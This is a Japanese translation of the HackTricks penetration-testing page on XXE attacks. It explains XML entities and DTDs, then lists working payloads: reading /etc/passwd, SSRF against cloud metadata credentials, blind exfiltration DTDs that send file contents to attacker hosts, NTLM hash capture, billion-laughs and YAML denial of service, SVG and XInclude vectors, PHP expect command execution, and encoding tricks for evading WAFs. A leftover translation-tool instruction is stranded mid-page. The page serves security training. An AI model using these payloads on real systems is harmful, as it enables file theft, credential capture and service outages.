# XXE - XEE - XML External Entity

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

XML External Entity攻撃は、XML入力を解析するアプリケーションに対する攻撃の一種です。

## XMLの基礎

**この部分のほとんどは、この素晴らしいPortswiggerのページから取られました:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### XMLとは何か？ <a href="#what-is-xml" id="what-is-xml"></a>

XMLは"extensible markup language"の略です。XMLはデータの保存と輸送のために設計された言語です。HTMLと同様に、XMLはタグとデータのツリー構造を使用します。HTMLと異なり、XMLは事前定義されたタグを使用せず、データを記述する名前をタグに付けることができます。ウェブの歴史の初期には、XMLはデータ輸送フォーマットとして流行していました（"AJAX"の"X"は"XML"を表します）。しかし、現在はJSONフォーマットに人気が移っています。

### XMLエンティティとは何か？ <a href="#what-are-xml-entities" id="what-are-xml-entities"></a>

XMLエンティティは、データ自体を使用する代わりに、XMLドキュメント内のデータ項目を表す方法です。さまざまなエンティティがXML言語の仕様に組み込まれています。例えば、エンティティ`&lt;`と`&gt;`は文字`<`と`>`を表します。これらはXMLタグを示すために使用されるメタ文字であり、データ内に現れる場合は通常、エンティティを使用して表される必要があります。

### XMLエレメントとは何か？

エレメント型宣言は、XMLドキュメントに現れることができるエレメントの型と数、どのエレメントが互いに現れることができるか、どの順序で現れる必要があるかのルールを設定します。例えば：

* `<!ELEMENT stockCheck ANY>` は、任意のオブジェクトが親エレメント`<stockCheck></stockCheck>`内に存在できることを意味します
* \<!ELEMENT stockCheck EMPTY> は、それが空であるべきことを意味します `<stockCheck></stockCheck>`
* \<!ELEMENT stockCheck (productId,storeId)> は、`<stockCheck>`が子エレメント`<productId>`と`<storeId>`を持つことができると宣言します

### ドキュメントタイプ定義とは何か？ <a href="#what-is-document-type-definition" id="what-is-document-type-definition"></a>

XMLドキュメントタイプ定義（DTD）には、XMLドキュメントの構造、含むことができるデータ値の型、その他の項目を定義することができる宣言が含まれています。DTDは、XMLドキュメントの開始時にオプションの`DOCTYPE`エレメント内で宣言されます。DTDは、ドキュメント自体内に完全に自己完結している（"内部DTD"と呼ばれる）か、他の場所からロードされる（"外部DTD"と呼ばれる）か、またはその両方のハイブリッドであることができます。

### XMLカスタムエンティティとは何か？ <a href="#what-are-xml-custom-entities" id="what-are-xml-custom-entities"></a>

XMLでは、DTD内でカスタムエンティティを定義することができます。例えば：

`<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>`

この定義は、エンティティ参照`&myentity;`の任意の使用がXMLドキュメント内で定義された値"`my entity value`"に置き換えられることを意味します。

### XML外部エンティティとは何か？ <a href="#what-are-xml-external-entities" id="what-are-xml-external-entities"></a>

XML外部エンティティは、定義が宣言されているDTDの外部に位置するカスタムエンティティの一種です。

外部エンティティの宣言には`SYSTEM`キーワードが使用され、エンティティの値をロードするためのURLを指定する必要があります。例えば：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>`

URLは`file://`プロトコルを使用することができ、したがって外部エンティティはファイルからロードすることができます。例えば：

`<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

XML外部エンティティは、[XML外部エンティティ攻撃](https://portswigger.net/web-security/xxe)が発生する主要な手段を提供します。

### XMLパラメータエンティティとは何か？

時には、アプリケーションによるいくつかの入力検証や使用されているXMLパーサーの強化のために、通常のエンティティを使用したXXE攻撃がブロックされます。この状況では、代わりにXMLパラメータエンティティを使用することができるかもしれません。XMLパラメータエンティティは、DTD内の他の場所でのみ参照できる特別な種類のXMLエンティティです。現在の目的のために、2つのことだけを知っておく必要があります。まず、XMLパラメータエンティティの宣言には、エンティティ名の前にパーセント文字が含まれます：

`<!ENTITY % myparameterentity "my parameter entity value" >`

そして二つ目に、パラメータエンティティは通常のアンパサンドの代わりにパーセント文字を使用して参照されます：%myparameterentity;`

これは、以下のようにXMLパラメータエンティティを使用して盲目のXXEをバンド外検出でテストすることができることを意味します：

`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`

このXXEペイロードは`xxe`というXMLパラメータエンティティを宣言し、そのエンティティをDTD内で使用します。これにより、攻撃者のドメインへのDNSルックアップとHTTPリクエストが発生し、攻撃が成功したことが確認されます。

## 主な攻撃

[これらの攻撃のほとんどは、素晴らしいPortswiggersのXEEラボを使用してテストされました: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

### 新しいエンティティテスト

この攻撃では、単純な新しいENTITY宣言が機能しているかをテストします
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### ファイルの読み取り

異なる方法で `/etc/passwd` を読み取ってみましょう。Windowsの場合は、`C:\windows\system32\drivers\etc\hosts` を読み取ることができます。

この最初のケースでは、SYSTEM "_**file:///**_etc/passwd_" も機能することに注意してください。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (221).png>)

この2番目のケースは、WebサーバーがPHPを使用している場合（Portswiggersのラボの場合ではない）にファイルを抽出するのに役立つはずです。
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
この第3のケースでは、`Element stockCheck` を ANY として宣言していることに注意してください。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (222) (1).png>)

### ディレクトリリスト

**Java** ベースのアプリケーションでは、XXE を使用して以下のようなペイロードで**ディレクトリの内容をリストする**ことが可能かもしれません（ファイルの代わりにディレクトリを要求するだけです）：
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

XXEを利用してクラウド内のSSRFを悪用することができます
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### Blind SSRF

**先に述べた技術**を使用して、サーバーが脆弱であることを示すために、制御しているサーバーにアクセスさせることができます。しかし、それが機能しない場合は、**XMLエンティティが許可されていない**可能性があります。その場合、**XMLパラメータエンティティ**を使用してみることができます：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Blind" SSRF - データをアウトオブバンドで抽出

**今回は、サーバーに新しいDTDを読み込ませ、そのDTDに含まれる悪意のあるペイロードがHTTPリクエストを介してファイルの内容を送信する方法を試みます（複数行のファイルの場合は** _**ftp://**_ **を介して抽出を試みることができます）。この説明は** [**Portswiggerのラボからのものです**](https://portswigger.net/web-security/xxe/blind)**。**

`/etc/hostname` ファイルの内容を抽出するための悪意のあるDTDの例は以下の通りです：
```markup
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
このDTDは以下のステップを実行します：

* `/etc/passwd` ファイルの内容を含む `file` というXMLパラメータエンティティを定義します。
* `exfiltrate` という別のXMLパラメータエンティティの動的宣言を含む `eval` というXMLパラメータエンティティを定義します。`exfiltrate` エンティティは、`file` エンティティの値をURLクエリストリング内に含むHTTPリクエストを攻撃者のウェブサーバーに対して行うことで評価されます。
* `eval` エンティティを使用し、`exfiltrate` エンティティの動的宣言を実行させます。
* 指定されたURLにリクエストすることでその値が評価されるように、`exfiltrate` エンティティを使用します。

攻撃者は、通常、自分のウェブサーバーにロードすることで、制御下にあるシステム上で悪意のあるDTDをホストする必要があります。例えば、攻撃者は以下のURLで悪意のあるDTDを提供するかもしれません：\
`http://web-attacker.com/malicious.dtd`

最後に、攻撃者は脆弱なアプリケーションに以下のXXEペイロードを送信する必要があります：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### エラーベース(外部DTD)

**このケースでは、サーバーに悪意のあるDTDを読み込ませ、エラーメッセージ内にファイルの内容を表示させます（エラーメッセージを見ることができる場合にのみ有効です）。** [**こちらの例。**](https://portswigger.net/web-security/xxe/blind)

以下のように悪意のある外部DTDを使用して、`/etc/passwd` ファイルの内容を含むXMLパースエラーメッセージをトリガーできます：
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
このDTDは以下のステップを実行します：

* `/etc/passwd` ファイルの内容を含む `file` というXMLパラメータエンティティを定義します。
* `error` という別のXMLパラメータエンティティの動的宣言を含む `eval` というXMLパラメータエンティティを定義します。`error` エンティティは、`file` エンティティの値を含む存在しないファイルをロードすることによって評価されます。
* `eval` エンティティを使用し、`error` エンティティの動的宣言を実行させます。
* `error` エンティティを使用すると、存在しないファイルをロードしようとしてその値が評価され、存在しないファイルの名前を含むエラーメッセージが生成されます。このファイルの名前は `/etc/passwd` ファイルの内容です。

外部DTDエラーを以下で呼び出します：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
以下は、サーバーの応答のエラーメッセージの中にファイルの内容が表示されるはずです。

![](<../.gitbook/assets/image (223) (1).png>)

_**外部DTDを使用すると、一つのエンティティを二つ目のエンティティ（`eval`）の中に含めることができますが、内部DTDではこれが禁止されています。そのため、通常は外部DTDを使用しないとエラーを強制することはできません。**_

### **エラーベース（システムDTD）**

では、外部とのやり取りがブロックされている（外部接続が利用できない）場合のブラインドXXEの脆弱性はどうでしょうか？[こちらからの情報](https://portswigger.net/web-security/xxe/blind)。

この状況では、XML言語仕様の抜け穴を利用して、**機密データを含むエラーメッセージをトリガーすることが可能**です。ドキュメントの**DTDが内部と外部のDTD宣言のハイブリッドを使用している場合**、**内部DTDは外部DTDで宣言されているエンティティを再定義することができます**。この場合、別のパラメータエンティティの定義内でXMLパラメータエンティティを使用するという制限が緩和されます。

つまり、攻撃者は、使用しているXMLパラメータエンティティが**外部DTD内で宣言されているエンティティを再定義している場合**、内部DTD内から**エラーベースのXXEテクニックを使用することができます**。もちろん、外部との接続がブロックされている場合、外部DTDはリモートの場所からロードすることはできません。代わりに、**アプリケーションサーバーにローカルな外部DTDファイル**である必要があります。_基本的に、攻撃はローカルファイルシステム上に存在するDTDファイルを呼び出し、既存のエンティティを機密データを含むパースエラーをトリガーするように再定義することを目的としています。_

例えば、サーバーファイルシステム上の`/usr/local/app/schema.dtd`という場所にDTDファイルがあり、このDTDファイルが`custom_entity`というエンティティを定義しているとします。攻撃者は、以下のようなハイブリッドDTDを送信することで、`/etc/passwd`ファイルの内容を含むXMLパースエラーメッセージをトリガーすることができます：
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
このDTDは以下のステップを実行します：

* サーバーファイルシステム上に存在する外部DTDファイルの内容を含む、`local_dtd`と呼ばれるXMLパラメータエンティティを定義します。
* 外部DTDファイルで既に定義されている`custom_entity`と呼ばれるXMLパラメータエンティティを再定義します。このエンティティは、`/etc/passwd`ファイルの内容を含むエラーメッセージをトリガーするために、既に説明された[error-based XXE exploit](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)を含むように再定義されます。
*   `local_dtd`エンティティを使用することで、外部DTDが解釈され、`custom_entity`エンティティの再定義された値を含むようになります。これにより、望ましいエラーメッセージが得られます。

**実世界の例：** GNOMEデスクトップ環境を使用するシステムは、しばしば`ISOamso`と呼ばれるエンティティを含むDTDを`/usr/share/yelp/dtd/docbookx.dtd`に持っています。
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

この技術は**内部DTDを使用するため、まず有効なものを見つける必要があります**。これを行うには、サーバーが使用しているのと同じ**OS / ソフトウェア**を**インストールして**、いくつかの**デフォルトDTDを探す**か、システム内の**デフォルトDTDのリストを取得して**、それらのいずれかが存在するか**確認**します。
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
### システム内のDTDの検出

以下の素晴らしいgithubリポジトリでは、**システム内に存在する可能性のあるDTDのパス**を見つけることができます：

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

さらに、**被害者システムのDockerイメージ**を持っている場合、同じリポジトリのツールを使用して**イメージ**を**スキャン**し、システム内に存在する**DTDのパス**を**見つける**ことができます。方法を学ぶには、[githubのReadme](https://github.com/GoSecure/dtd-finder)を読んでください。
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXEを介したOffice Open XMLパーサー

この攻撃のより詳細な説明については、**Detectifyの[この素晴らしい投稿](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/)の第2セクションを確認してください**。

**Microsoft Officeドキュメントのアップロード機能は多くのウェブアプリケーションで提供されています**。これらのアプリケーションは、ドキュメントから特定の詳細を抽出することがあります。例えば、ウェブアプリケーションは、ユーザーがXLSX形式のスプレッドシートをアップロードすることでデータをインポートすることを許可するかもしれません。パーサーがスプレッドシートからデータを抽出するためには、少なくとも1つのXMLファイルを解析する必要があります。

この脆弱性をテストするためには、**XXEペイロードを含むMicrosoft Officeファイルを作成する必要があります**。最初のステップは、ドキュメントを解凍できる空のディレクトリを作成することです。

ドキュメントが解凍されたら、`./unzipped/word/document.xml`にあるXMLファイルを開き、好みのテキストエディタ（例えばvim）で編集します。XMLは、HTTPリクエストで始まることが多い、望ましいXXEペイロードを含むように変更する必要があります。

変更されたXML行は、2つのルートXMLオブジェクトの間に挿入する必要があります。リクエストを監視可能なURLに置き換えることが重要です。

最後に、ファイルを圧縮して悪意のあるpoc.docxファイルを作成します。以前に作成した「unzipped」ディレクトリから、次のコマンドを実行する必要があります：

これで、作成されたファイルを潜在的に脆弱なウェブアプリケーションにアップロードし、Burp Collaboratorのログにリクエストが表示されることを期待できます。


### Jar: プロトコル

`jar`プロトコルは**Javaアプリケーション**でのみ利用可能です。これは、**PKZIP**ファイル（`.zip`、`.jar`、...）内のファイルにアクセスすることを可能にし、ローカルおよびリモートファイルに対して機能します：
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIPファイル内のファイルにアクセスできることは、**システムDTDファイルを介してXXEを悪用するために非常に有用です。** [このセクションでシステムDTDファイルの悪用方法を学びましょう](xxe-xee-xml-external-entity.md#error-based-system-dtd)。
{% endhint %}

#### 舞台裏

1. zipアーカイブをロードするためにHTTPリクエストを行います。 `https://download.host.com/myarchive.zip`
2. HTTPレスポンスを一時的な場所に保存します。 `/tmp/...`
3. アーカイブを抽出します。
4. `file.zip`を読み取ります。
5. 一時ファイルを削除します。

2番目のステップでフローを停止することが可能です。トリックは、ファイルを提供するときに接続を決して閉じないことです。 [これらのツールが役立つかもしれません](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution)：pythonで`slow_http_server.py`とjavaで`slowserver.jar`。

サーバーがファイルをダウンロードしたら、tempディレクトリをブラウズしてその場所を見つける必要があります。ランダムであるため、ファイルパスは事前に予測できません。

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
一時ディレクトリにファイルを書き込むことは、**パストラバーサルに関連する別の脆弱性をエスカレートするのに役立つ**ことがあります（ローカルファイルインクルード、テンプレートインジェクション、XSLT RCE、デシリアライゼーションなど）。
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### ビリオン・ラフ・アタック
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml 攻撃
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Quadratic Blowup Attack

![](<../.gitbook/assets/image (531).png>)

#### NTMLの取得

Windowsホストでは、responder.pyハンドラを設定することで、WebサーバーユーザーのNTMLハッシュを取得することが可能です。
```
Responder.py -I eth0 -v
```
送信することで
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
その後、hashcatを使用してハッシュをクラックすることができます。

## 隠されたXXEの発生箇所

### XInclude

[こちらから。](https://portswigger.net/web-security/xxe)

一部のアプリケーションは**クライアントから提出されたデータを受け取り、サーバー側でXMLドキュメントに埋め込んでから、そのドキュメントを解析します**。この例は、クライアントから提出されたデータが**バックエンドのSOAPリクエスト**に配置され、その後バックエンドのSOAPサービスによって処理される場合に発生します。

この状況では、**XMLドキュメント全体を制御していないため、`DOCTYPE`要素を定義または変更することができず**、従来のXXE攻撃を実行することはできません。しかし、代わりに`XInclude`を使用することができるかもしれません。`XInclude`はXML仕様の一部であり、XMLドキュメントをサブドキュメントから構築することを可能にします。XMLドキュメント内の任意のデータ値に`XInclude`攻撃を配置することができるため、サーバー側のXMLドキュメントに配置される単一のデータ項目のみを制御している状況でも攻撃を実行できます。

`XInclude`攻撃を実行するには、`XInclude`名前空間を参照し、含めたいファイルへのパスを提供する必要があります。例えば：
```markup
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
### SVG - ファイルアップロード

[こちらから。](https://portswigger.net/web-security/xxe)

一部のアプリケーションでは、ユーザーがファイルをアップロードし、その後サーバー側で処理されます。一般的なファイル形式にはXMLが使用されているか、XMLのサブコンポーネントを含んでいます。XMLベースの形式の例には、DOCXのようなオフィス文書形式やSVGのような画像形式があります。

例えば、アプリケーションがユーザーに**画像のアップロード**を許可し、アップロード後にサーバーでこれらを処理または検証することがあります。アプリケーションがPNGやJPEGのような形式を受け取ることを期待していても、使用されている**画像処理ライブラリがSVG画像をサポートしている**可能性があります。SVG形式はXMLを使用しているため、攻撃者は悪意のあるSVG画像を送信し、XXE脆弱性のための隠された攻撃面に到達することができます。
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
**コマンドを実行**するためにPHPの"expect"ラッパーを使用することもできます：
```markup
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
**注：読み取ったファイルの最初の行または実行結果は、作成された画像の中に表示されます。そのため、SVGが作成した画像にアクセスできる必要があります。**

### **PDF - ファイルアップロード**

PDFファイルをアップロードしてXXEを悪用する方法については、以下の投稿を読んでください：

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: x-www-urlencodedからXMLへ

POSTリクエストがXML形式のデータを受け入れる場合、そのリクエストでXXEを悪用できる可能性があります。例えば、通常のリクエストに以下の内容が含まれている場合：
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
その場合、以下のリクエストを送信して、同じ結果を得ることができるかもしれません：
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: JSONからXEEへの変換

リクエストを変更するには、“**Content Type Converter**”というBurp拡張機能を使用できます。[こちら](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html)でこの例を見ることができます：
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
以下は、ハッキング技術に関する本の内容です。ファイル `pentesting-web/xxe-xee-xml-external-entity.md` からの関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返します。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、単語「leak」、ペネトレーションテスト、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは何も追加しないでください。

他の例は[こちら](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2)で見つけることができます。

## WAF & Protections Bypasses

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
この方法は、XMLサーバーが `data://` プロトコルを受け入れる場合にのみ機能します。

### UTF-7

ここで \[**"Encode Recipe"** の cyberchef を使用して ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) でUTF-7に変換します。
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ プロトコルバイパス

ウェブがPHPを使用している場合、`file:/` の代わりに **phpラッパー** `php://filter/convert.base64-encode/resource=` を使用して**内部ファイルにアクセス**できます。

ウェブがJavaを使用している場合は、[**jar: プロトコル**](xxe-xee-xml-external-entity.md#jar-protocol)を確認してください。

### HTML エンティティ

[**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)からのトリック\
**html エンティティ**を使用して**エンティティ内にエンティティ**を作成し、それを呼び出して**dtdをロード**します。\
使用する**HTML エンティティ**は**数値**である必要があります（[この例のように](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric%20entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)）。
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTDの例：
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP ラッパー

### Base64

**抽出** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **外部リソースの抽出**
```markup
